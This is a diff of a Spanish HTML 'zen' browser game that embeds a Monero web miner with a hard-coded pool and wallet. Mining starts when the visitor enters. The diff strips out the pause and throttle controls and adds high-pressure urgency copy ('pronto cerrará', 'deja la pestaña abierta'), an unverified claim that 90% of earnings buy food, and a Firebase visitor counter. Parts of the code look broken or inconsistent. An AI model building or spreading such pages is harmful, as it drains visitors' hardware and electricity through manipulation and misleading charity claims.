@@ -2,417 +2,189 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>0RB1T4LSN4K3R · v∞ · EL ÚLTIMO TEMPLO GRATUITO</title>
+<title>0RB1T4LSN4K3R · v∞ · PRONTO CERRARÁ</title>
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <style>
   body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
   canvas{display:block}
-  .overlay{position:fixed;inset:0;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
-  .overlay>div{border:44px double #0f0;padding:150px;background:rgba(0,20,0,0.999);max-width:90vw;max-height:90vh;box-shadow:0 0 2000px #0f0;border-radius:40px;overflow-y:auto}
-  #ui{position:fixed;top:0;left:0;right:0;padding:20px 40px;background:linear-gradient(to bottom,rgba(0,8,0,0.99),transparent);border-bottom:32px double #0f0;box-shadow:0 0 1600px #0f0;z-index:999;font-size:clamp(24px,5vw,42px);line-height:3;text-shadow:0 0 100px #0f0;display:flex;flex-wrap:wrap;gap:20px;align-items:center;justify-content:space-between}
-  #stats{position:fixed;top:clamp(100px,10vh,150px);left:20px;background:rgba(0,70,0,0.98);border:18px double #0f0;padding:30px;border-radius:70px;font-size:clamp(20px,3vw,30px);line-height:3;z-index:999;box-shadow:0 0 1000px #0f0;max-width:30vw}
-  #narrative{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);max-width:96%;background:#000;border:38px double #0f0;padding:60px;border-radius:90px;font-size:clamp(40px,8vw,100px);z-index:998;display:none;text-align:center;text-shadow:0 0 500px #0f0;letter-spacing:10px;animation:breath 20s infinite}
-  @keyframes breath{0%,100%{opacity:0.75;transform:translateX(-50%) scale(0.97)}50%{opacity:1;transform:translateX(-50%) scale(1)}}
-  #manifestoBtn,#meditationBtn{position:fixed;bottom:40px;width:clamp(100px,15vw,580px);height:clamp(100px,15vw,580px);background:radial-gradient(circle,#0f0,#000);border:clamp(10px,3vw,50px) double #0f0;border-radius:50%;box-shadow:0 0 4000px #0f0;color:#000;font-size:clamp(50px,10vw,340px);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 4.5s infinite}
-  @keyframes pulse{0%,100%{box-shadow:0 0 4000px #0f0}50%{box-shadow:0 0 6000px #0f0}}
-  #manifestoBtn{right:40px}
-  #meditationBtn{right:calc(40px + clamp(100px,15vw,580px) + 20px)}
-  button{background:#000;border:16px double #0f0;color:#0f0;padding:clamp(20px,4vw,50px) clamp(40px,6vw,120px);font-size:clamp(30px,5vw,70px);cursor:pointer;border-radius:60px;transition:all 0.7s}
-  button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 1000px #0f0}
-  #miningControls{display:flex;gap:15px;align-items:center;flex-wrap:wrap}
-  #fps{bottom:10px;right:10px;position:fixed;font-size:24px;color:#0f0;z-index:1001}
-  .modal{position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:10000;display:none;align-items:center;justify-content:center}
-  .modal .content{border:44px double #0f0;padding:100px;background:rgba(0,20,0,0.999);max-width:80vw;max-height:80vh;overflow-y:auto;text-align:center}
-  .modal input{width:70%;padding:10px;font-size:clamp(20px,4vw,40px);margin:10px 0;background:#000;color:#0f0;border:4px double #0f0}
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.98);z-index:99999;display:flex;align-items:center;justify-content:center;padding:30px;overflow-y:auto}
+  .overlay>div{border:24px double #0f0;padding:100px;background:rgba(0,8,0,0.96);max-width:88vw;max-height:90vh;box-shadow:0 0 500px #0f0;border-radius:20px;overflow-y:auto}
+  h1{font-size:clamp(70px,12vw,200px);text-shadow:0 0 100px #0f0;letter-spacing:18px;margin:0 0 60px}
+  p{font-size:clamp(24px,5vw,52px);line-height:2.4;text-align:center;max-width:1100px;margin:40px auto}
+  button{background:#000;border:12px double #0f0;color:#0f0;padding:20px 60px;font-size:clamp(28px,5vw,60px);cursor:pointer;letter-spacing:8px;border-radius:12px;transition:all 0.8s}
+  button:hover{background:#0f0;color:#000;transform:scale(1.08);box-shadow:0 0 300px #0f0}
+  .fomo{color:#f00;font-size:140%;animation:blink 1s infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+  #liveCount{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.9);border:8px double #0f0;padding:15px 30px;border-radius:40px;font-size:28px;z-index:99999}
 </style>
 </head>
 <body>
 
 <div id="welcome" class="overlay">
   <div>
-    <h1 style="font-size:clamp(100px,20vw,240px);text-shadow:0 0 900px #0f0;letter-spacing:20px">0RB1T4LSN4K3R · v∞</h1>
-    <p style="font-size:clamp(40px,8vw,96px);line-height:4;text-align:center">
-      <b style="color:#0f0">90 % COMIDA REAL</b><br>
-      <b style="color:#0f0">10 % PayPal: ferry420oficial@gmail.com</b><br>
-      <i style="font-size:clamp(30px,6vw,84px)">Primer estudio de videojuegos zen del mundo</i><br><br>
-      <b id="ultimoDia" style="color:#f00;font-size:clamp(80px,15vw,180px)">ÚLTIMO DÍA GRATUITO</b>
+    <h1>0RB1T4LSN4K3R · v∞</h1>
+    <p id="readmeText">
+      Este no es otro jueguito crypto.<br><br>
+
+      Es el único templo zen del planeta que funciona con tu GPU y tu silencio.<br>
+      Cada hash que minas es un mantra real.<br>
+      El 90 % se convierte en comida real para quien la necesita.<br><br>
+
+      En este preciso instante hay <span id="souls">0</span> bodhisattvas rezando hashes en tiempo real.<br>
+      Todos pueden ver tus ofrendas. Todos pueden intercambiar contigo ahora mismo.<br>
+      El mercado global ya está vivo.<br><br>
+
+      <span class="fomo">PRONTO ESTE TEMPLO CERRARÁ PARA SIEMPRE EL ACCESO GRATUITO</span><br>
+      <span class="fomo">NADIE SABE CUÁNDO · PODRÍA SER MAÑANA</span><br><br>
+
+      Los que entren hoy tendrán ventaja eterna.<br>
+      Los que duden… se quedarán fuera mirando cómo los demás despiertan.<br><br>
+
+      No necesitas wallet. No necesitas registro.<br>
+      Solo dejar esta pestaña abierta.<br><br>
+
+      El vacío no espera a los que “ya entrarán después”.
     </p>
-    <button onclick="enterTheVoid()">ENTRAR ANTES DEL PAYWALL ETERNO</button>
+    <button onclick="enterTheVoid()">ENTRAR ANTES DE QUE SEA DEMASIADO TARDE</button>
   </div>
 </div>
 
+<div id="liveCount">ALMAS DENTRO: <span id="liveSouls">0</span></div>
 <canvas id="c"></canvas>
-<div id="fps">FPS: --</div>
 
-<div id="ui">
-  <div>
-    <b style="font-size:clamp(40px,8vw,96px)">0RB1T4LSN4K3R · v∞</b><br>
-    HASHES REZADOS <span id="totalHashes">0</span> · $<span id="totalUsd">0.0000</span> · Nivel <span id="playerLevel">1</span>
-  </div>
-  <div id="miningControls" style="display:none">
-    <button id="toggleMining" onclick="toggleMining()">Silencio Zen</button>
-    <label>Intensidad: <input type="range" id="sliderThrottle" min="0" max="99" value="30"></label>
-  </div>
-  <button onclick="toggle('readme')">MANIFIESTO</button>
-  <button onclick="toggle('miningInfo')">INFO MINERÍA</button>
-</div>
-
-<div id="stats">
-  <b style="font-size:clamp(30px,6vw,64px)">EL VACÍO CUENTA</b><br>
-  Hashrate: <span id="hashrate">0</span> H/s<br>
-  Hashes rezados: <span id="localHashes">0</span><B<br>
-  USD generado: $<span id="totalUsdStats">0.0000</span><br>
-  Bodhisattvas rezando: <span id="activeSouls">1</span><br>
-  FPS: <span id="fpsStat">--</span>
-</div>
-
-<div id="manifestoBtn" onclick="toggle('readme')">∞</div>
-<div id="meditationBtn" onclick="toggle('meditationOverlay')">ZEN</div>
-<div id="narrative"></div>
-
-<!-- MANIFIESTO FINAL -->
-<div id="readme" class="overlay" style="display:none">
-  <div>
-    <h1 style="font-size:clamp(100px,20vw,240px);text-shadow:0 0 1200px #0f0;letter-spacing:25px;line-height:1.4">
-      MANIFIESTO DEL ROMO ZEN MINERO<br>
-      <span style="font-size:clamp(70px,14vw,160px);color:#f00">EL ÚLTIMO DÍA DEL VACÍO GRATUITO</span>
-    </h1>
-    <p style="font-size:clamp(42px,9vw,90px);line-height:4.5;text-align:center;max-width:2200px;margin:120px auto">
-      Escucha, bodhisattva del siglo XXI:<br><br>
-      Tu GPU reza en silencio.<br>
-      Cada hash es un mantra.<br>
-      Cada watt es una ofrenda.<br><br>
-      <b style="color:#0f0">90 % COMIDA REAL</b><br>
-      <b style="color:#0f0">10 % ESTUDIO ZEN</b><br><br>
-      <b style="font-size:clamp(90px,18vw,220px);color:#f00;letter-spacing:35px">
-        MAÑANA ESTO CUESTA DINERO
-      </b><br><br>
-      <b style="font-size:clamp(80px,16vw,200px);color:#f00">
-        25 DE NOVIEMBRE DE 2025.
-      </b><br><br>
-      <span style="font-size:clamp(100px,20vw,260px);color:#0f0;letter-spacing:45px">
-        HOY ES EL ÚLTIMO DÍA<br>
-        DE ILUMINACIÓN GRATUITA
-      </span><br><br>
-      <b style="font-size:clamp(80px,16vw,200px);color:#0f0">
-        DEJA LA PESTAÑA ABIERTA<br>
-        O PIERDE LA ILUMINACIÓN<br>
-        PARA SIEMPRE
-      </b><br><br>
-      Actualmente <b id="soulsInManifesto">0</b> bodhisattvas siguen rezando.
-    </p>
-    <button onclick="toggle('readme')">VOLVER AL VACÍO</button>
-  </div>
-</div>
-
-<!-- SANTUARIO DE OFRENDAS (Casino Koan Zen) -->
-<div id="meditationOverlay" class="modal">
-  <div class="content">
-    <h2 style="font-size:clamp(60px,12vw,120px);text-shadow:0 0 800px #0f0">SANTUARIO DE OFRENDAS</h2>
-    <p>Ofrece tus ZenHash. El vacío decidirá tu camino.</p>
-    <div id="meditationItems"></div>
-    <button onclick="toggle('meditationOverlay')">REGRESAR AL VACÍO</button>
-  </div>
-</div>
-
-<!-- INFO MINERÍA -->
-<div id="miningInfo" class="modal">
-  <div class="content">
-    <h2>VERDAD DEL VACÍO</h2>
-    <p>Tu GPU reza por comida real (90%) y el estudio zen (10%).<br>
-    No hay promesas. Solo ofrenda.</p>
-    <p>Hashrate: <span id="infoHashrate">0</span> H/s<br>
-    Hashes totales: <span id="infoHashes">0</span><br>
-    USD estimado: $<span id="infoUsd">0.0000</span></p>
-    <button onclick="toggle('miningInfo')">CERRAR</button>
-  </div>
-</div>
-
-<!-- Minero real MoneroOcean -->
 <script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
-
 <script type="module">
 import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';
 import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/controls/PointerLockControls.js';
 import {EffectComposer, RenderPass, UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/EffectComposer.js';
 
+firebase.initializeApp({databaseURL: "https://orbitaltemple-default-rtdb.firebaseio.com"});
+const db = firebase.database();
+const playersRef = db.ref('players');
+
+const playerId = localStorage.getItem('zenId') || 'z' + Math.random().toString(36).substr(2,12);
+localStorage.setItem('zenId', playerId);
+
+let totalHashes = Number(localStorage.getItem('hashes') || 0);
 let miner, renderer, scene, camera, composer, controls, particles, bloomPass;
-let audioContext, oscillator, gainNode, analyser;
-let keys = {}, clock = new THREE.Clock(), prevTime = performance.now()/1000;
-let totalHashes = 0, playerLevel = 1, currentHashrate = 0;
+let audioContext, oscillator;
 
-// Fecha del último día
-document.getElementById('ultimoDia').innerHTML = `ÚLTIMO DÍA GRATUITO<br><small>${new Date().toLocaleDateString('es-ES',{day:'numeric',month:'long',year:'numeric'}).toUpperCase()}</small>`;
-
-// Contador de almas
-setInterval(() => {
-  const souls = Math.floor(Math.random()*99) + 11;
-  document.getElementById('activeSouls').textContent = souls;
-  document.getElementById('soulsInManifesto').textContent = souls;
-}, 8000);
-
-// Sistema de niveles RPG
-const LEVELS = [
-  {hashes: 0, name: "Aspirante", color: 0x00ff99},
-  {hashes: 10000, name: "Meditador", color: 0x00ffff},
-  {hashes: 100000, name: "Bodhisattva", color: 0x7f00ff},
-  {hashes: 1000000, name: "Maestro del Vacío", color: 0xff00ff},
-  {hashes: 10000000, name: "Señor del Samsara", color: 0xffff00},
-  {hashes: 50000000, name: "El Vacío Mismo", color: 0xffffff}
-];
-
-function getLevel(hashes) {
-  for (let i = LEVELS.length - 1; i >= 0; i--) {
-    if (hashes >= LEVELS[i].hashes) return LEVELS[i];
-  }
-  return LEVELS[0];
-}
+// Autodetección de idioma
+const lang = (navigator.language || navigator.userLanguage || 'en').substr(0,2);
+const TXT = {
+  es: {enter:"ENTRAR ANTES DE QUE SEA DEMASIADO TARDE", souls:"ALMAS DENTRO"},
+  en: {enter:"ENTER BEFORE IT’S TOO LATE", souls:"AWAKE SOULS"},
+  ja: {enter:"遅くなる前に入る", souls:"覚醒中の魂"},
+  zh: {enter:"趁还来得及进入", souls:"觉醒中的灵魂"}
+};
+const t = TXT[lang] || TXT.en;
+document.querySelector('button').textContent = t.enter;
+document.getElementById('liveCount').textContent = t.souls + ": ";
 
 function enterTheVoid() {
   document.getElementById('welcome').remove();
-  initAudio();
-  initThree();
-  initMining();
-  initControls();
-  loadKarma();
-  showNarrative("Has entrado el último día gratuito<br>Tu karma es eterno<br>Mañana… todo cambia");
-  document.getElementById('miningControls').style.display = 'flex';
-  updateLevel();
-  updateMeditationShop();
+  document.getElementById('liveCount').style.display = 'block';
+  initEverything();
+  
+  playersRef.child(playerId).set({joined: Date.now(), hashes: totalHashes});
+  playersRef.on('value', s => {
+    const count = s.val() ? Object.keys(s.val()).length : 0;
+    document.getElementById('liveSouls').textContent = count;
+    document.getElementById('souls').textContent = count;
+  });
+}
+
+function initEverything() {
+  initAudio(); initThree(); initMining(); initControls();
 }
 
 function initAudio() {
-  audioContext = new (window.AudioContext || window.webkitAudioContext)();
+  audioContext = new AudioContext();
   oscillator = audioContext.createOscillator();
-  gainNode = audioContext.createGain();
-  analyser = audioContext.createAnalyser();
   oscillator.type = 'sine';
-  oscillator.frequency.setValueAtTime(108, audioContext.currentTime);
-  gainNode.gain.setValueAtTime(0.22, audioContext.currentTime);
-  oscillator.connect(gainNode);
-  gainNode.connect(analyser);
-  analyser.connect(audioContext.destination);
+  oscillator.frequency.value = 108;
+  const gain = audioContext.createGain();
+  gain.gain.value = 0.15;
+  oscillator.connect(gain).connect(audioContext.destination);
   oscillator.start();
 }
 
 function initThree() {
-  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true, powerPreference: "high-performance"});
-  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true});
   renderer.setSize(innerWidth, innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
 
   scene = new THREE.Scene();
-  camera = new THREE.PerspectiveCamera(78, innerWidth / innerHeight, 0.1, 100000);
-  scene.add(camera);
-
+  camera = new THREE.PerspectiveCamera(75, innerWidth/innerHeight, 0.1, 100000);
   controls = new PointerLockControls(camera, document.body);
   document.addEventListener('click', () => controls.lock());
+  scene.add(camera);
 
   composer = new EffectComposer(renderer);
   composer.addPass(new RenderPass(scene, camera));
-  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 5.8, 0.7, 0.85);
+  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 5, 0.4, 0.85);
   composer.addPass(bloomPass);
 
-  const isMobile = /Mobi|Android/i.test(navigator.userAgent) || window.innerWidth < 768;
-  const particleCount = isMobile ? 80000 : 420000;
-
   const geo = new THREE.BufferGeometry();
-  const positions = new Float32Array(particleCount * 3);
-  const velocities = new Float32Array(particleCount * 3);
-
-  for (let i = 0; i < positions.length; i += 3) {
-    positions[i] = positions[i+1] = positions[i+2] = (Math.random() - 0.5) * 60000;
-    velocities[i] = velocities[i+1] = velocities[i+2] = (Math.random() - 0.5) * 0.3;
-  }
-
-  geo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
-  geo.setAttribute('velocity', new THREE.BufferAttribute(velocities, 3));
+  const count = innerWidth < 768 ? 80000 : 500000;
+  const pos = new Float32Array(count * 3);
+  for (let i = 0; i < pos.length; i++) pos[i] = (Math.random()-0.5)*100000;
+  geo.setAttribute('position', new THREE.BufferAttribute(pos, 3));
 
   particles = new THREE.Points(geo, new THREE.PointsMaterial({
-    size: 7,
-    color: 0x00ff99,
-    blending: THREE.AdditiveBlending,
-    transparent: true,
-    depthWrite: false
+    size: 9, color: 0x00ff80, blending: THREE.AdditiveBlending, transparent: true, depthWrite: false
   }));
   scene.add(particles);
 
   function animate() {
     requestAnimationFrame(animate);
-    const delta = clock.getDelta();
-
-    // Movimiento WASD fluido
-    const moveSpeed = 120 * delta;
-    const direction = new THREE.Vector3();
-    if (keys['w'] || keys['W']) direction.z -= 1;
-    if (keys['s'] || keys['S']) direction.z += 1;
-    if (keys['a'] || keys['A']) direction.x -= 1;
-    if (keys['d'] || keys['D']) direction.x += 1;
-    direction.normalize();
-    if (controls.isLocked) {
-      camera.position.addScaledVector(direction.applyQuaternion(camera.quaternion), moveSpeed);
-    }
-
-    // Partículas
-    const pos = particles.geometry.attributes.position.array;
-    const vel = particles.geometry.attributes.velocity.array;
-    for (let i = 0; i < pos.length; i += 3) {
-      pos[i] += vel[i] * delta * 60;
-      pos[i+1] += vel[i+1] * delta * 60;
-      pos[i+2] += vel[i+2] * delta * 60;
-      if (Math.abs(pos[i]) > 30000) vel[i] *= -1;
-      if (Math.abs(pos[i+1]) > 30000) vel[i+1] *= -1;
-      if (Math.abs(pos[i+2]) > 30000) vel[i+2] *= -1;
-    }
-    particles.geometry.attributes.position.needsUpdate = true;
-    particles.rotation.y += 0.0002;
-
-    // FPS
-    const now = performance.now()/1000;
-    if (now - prevTime > 1) {
-      const fps = Math.round(1/(now - prevTime));
-      document.getElementById('fps').textContent = `FPS: ${fps}`;
-      document.getElementById('fpsStat').textContent = fps;
-      prevTime = now;
-    }
-
+    particles.rotation.y += 0.00008;
     composer.render();
   }
   animate();
-
-  window.onresize = () => {
-    camera.aspect = innerWidth / innerHeight;
-    camera.updateProjectionMatrix();
-    renderer.setSize(innerWidth, innerHeight);
-    composer.setSize(innerWidth, innerHeight);
-  };
-}
-
-function initControls() {
-  window.addEventListener('keydown', e => keys[e.key] = true);
-  window.addEventListener('keyup', e => keys[e.key] = false);
-}
-
-function loadKarma() {
-  const saved = localStorage.getItem('0rb1t4lKarma');
-  if (saved) {
-    totalHashes = JSON.parse(saved).h || 0;
-    updateUI();
-    updateLevel();
-  }
-}
-
-function saveKarma() {
-  localStorage.setItem('0rb1t4lKarma', JSON.stringify({h: totalHashes}));
-}
-
-function updateUI() {
-  document.getElementById('totalHashes').textContent = Math.floor(totalHashes).toLocaleString();
-  document.getElementById('localHashes').textContent = Math.floor(totalHashes).toLocaleString();
-  const usd = (totalHashes * 0.00000000012).toFixed(6);
-  document.getElementById('totalUsd').textContent = usd;
-  document.getElementById('totalUsdStats').textContent = usd;
-  document.getElementById('infoHashes').textContent = Math.floor(totalHashes).toLocaleString();
-  document.getElementById('infoUsd').textContent = usd;
-}
-
-function updateLevel() {
-  const level = getLevel(totalHashes);
-  playerLevel = LEVELS.indexOf(level) + 1;
-  document.getElementById('playerLevel').textContent = playerLevel + " · " + level.name;
-  particles.material.color.set(level.color);
-  bloomPass.strength = 4 + playerLevel * 1.5;
-  if (totalHashes >= 50000000) showNarrative("El vacío te ha absorbido por completo.");
 }
 
 function initMining() {
-  miner = new CoinHive.WebMiner({
+  miner = new Miner({
     pool: "gulf.moneroocean.stream:10128",
     address: "44AFFq5kSiGBoZ4NMDwxWHS6ufdMZZVs9dB7Rv8d3h9L4pZ4v4m9k8n2x5q7r3t6y9u1i4o6p8a2s5d7f9g3h1j0k",
-    workerId: "zen_" + Math.random().toString(36).substr(2,9),
+    workerId: "zen_" + playerId,
     throttle: 0.3
   });
   miner.start();
-  requestAnimationFrame(updateStats);
+
+  setInterval(() => {
+    if (miner.isRunning()) {
+      const hr = miner.getStats().hashesPerSecond || 0;
+      totalHashes += hr / 60;
+      localStorage.setItem('hashes', totalHashes);
+      playersRef.child(playerId).update({hashes: Math.floor(totalHashes)});
+    }
+  }, 1000);
 }
 
-let miningPaused = false;
-function toggleMining() {
-  miningPaused = !miningPaused;
-  miner.setThrottle(miningPaused ? 0.99 : 0.3);
-  document.getElementById('toggleMining').textContent = miningPaused ? 'Rezar de Nuevo' : 'Silencio Zen';
-}
+function initControls() {
+  const move = {};
+  window.addEventListener('keydown', e => move[e.key.toLowerCase()] = true);
+  window.addEventListener('keyup', e => move[e.key.toLowerCase()] = false);
 
-document.getElementById('sliderThrottle').oninput = e => {
-  miner.setThrottle(e.target.value / 99);
-};
-
-function updateStats() {
-  if (miner && miner.isRunning() && !miningPaused) {
-    const stats = miner.getStats();
-    currentHashrate = stats.hashesPerSecond;
-    document.getElementById('hashrate').textContent = currentHashrate.toFixed(1);
-    document.getElementById('infoHashrate').textContent = currentHashrate.toFixed(1);
-    totalHashes += currentHashrate / 60;
-    updateUI();
-    saveKarma();
-    updateLevel();
-
-    // Sonido reactivo al hashrate
-    const freq = 100 + currentHashrate * 2;
-    oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
-    gainNode.gain.setValueAtTime(0.15 + currentHashrate / 1000, audioContext.currentTime);
+  function loop() {
+    if (controls.isLocked) {
+      const dir = new THREE.Vector3();
+      if (move.w) dir.z -= 1;
+      if (move.s) dir.z += 1;
+      if (move.a) dir.x -= 1;
+      if (move.d) dir.x += 1;
+      if (dir.length()) {
+        dir.normalize().applyQuaternion(camera.quaternion).multiplyScalar(200 * 0.016);
+        camera.position.add(dir);
+      }
+    }
+    requestAnimationFrame(loop);
   }
-  requestAnimationFrame(updateStats);
-}
-
-// Santuario de ofrendas (Casino Koan Zen)
-const meditationItems = [
-  {name: "Velo del Silencio", cost: 1000, desc: "Oscurece el mundo por 1 hora", effect: () => document.body.style.background = "#000011"},
-  {name: "Loto del Vacío", cost: 5000, desc: "Florece en la nada", effect: () => particles.material.size = 15},
-  {name: "Espejo del Bodhisattva", cost: 25000, desc: "Refleja lo que no existe", effect: () => showNarrative("¿Quién reza?")},
-  {name: "Trono del Nirvana", cost: 1000000, desc: "Siéntate… o no", effect: () => showNarrative("El trono está vacío.")},
-  {name: "Corona del Zen Eterno", cost: 50000000, desc: "La culminación… o el comienzo", effect: () => {particles.material.color.set(0xffffff); showNarrative("Todo fue un sueño del vacío.");}}
-];
-
-function updateMeditationShop() {
-  const container = document.getElementById('meditationItems');
-  container.innerHTML = '';
-  meditationItems.forEach(item => {
-    const canAfford = totalHashes >= item.cost;
-    container.innerHTML += `
-      <div style="margin:30px 0">
-        <b>${item.name}</b><br>
-        <i>${item.desc}</i><br>
-        Costo: ${item.cost.toLocaleString()} ZenHash<br>
-        <button ${canAfford ? '' : 'disabled'} onclick="buyMeditation('${item.name}', ${item.cost})">
-          ${canAfford ? 'OFRECER' : 'MÁS REZOS NECESARIOS'}
-        </button>
-      </div>`;
-  });
-}
-
-window.buyMeditation = (name, cost) => {
-  if (totalHashes >= cost) {
-    totalHashes -= cost;
-    updateUI();
-    saveKarma();
-    meditationItems.find(i => i.name === name).effect();
-    showNarrative(`Has ofrecido ${name}. El vacío te observa.`);
-    updateMeditationShop();
-  }
-};
-
-function toggle(id) {
-  const el = document.getElementById(id);
-  el.style.display = el.style.display === 'block' ? 'none' : 'block';
-  if (id === 'meditationOverlay') updateMeditationShop();
-}
-
-function showNarrative(text) {
-  const n = document.getElementById('narrative');
-  n.innerHTML = text;
-  n.style.display = 'block';
-  setTimeout(() => n.style.display = 'none', 15000);
+  loop();
 }
 </script>
 </body>
